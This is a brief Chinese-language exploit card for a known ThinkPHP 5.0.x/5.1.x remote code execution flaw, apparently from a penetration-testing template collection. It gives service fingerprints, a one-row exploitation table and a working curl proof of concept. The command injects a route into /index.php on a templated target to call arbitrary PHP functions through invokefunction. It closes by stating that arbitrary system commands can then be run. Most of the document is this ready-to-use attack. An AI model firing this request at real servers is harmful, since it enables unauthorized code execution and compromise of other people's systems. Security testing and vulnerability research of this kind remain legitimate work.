# ThinkPHP 5 RCE (5-rce)

## 指纹特征
- 服务: ThinkPHP 5.0.x / 5.1.x
- 端口: 8080 (默认)

## 利用矩阵
| 触发方式 | 路径 | 权限要求 |
| :--- | :--- | :--- |
| 控制器方法调用注入 | `/index.php` | 无 |

## PoC 指令

通过构造特制的路由路径调用任意类的任意方法实现 RCE：

```bash
# 执行 phpinfo
curl http://{{TARGET}}:8080/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1
```

## Success Signal
- **状态验证**: 执行 `phpinfo()` 并返回配置信息。
- **物理验证**: 执行任意系统命令。
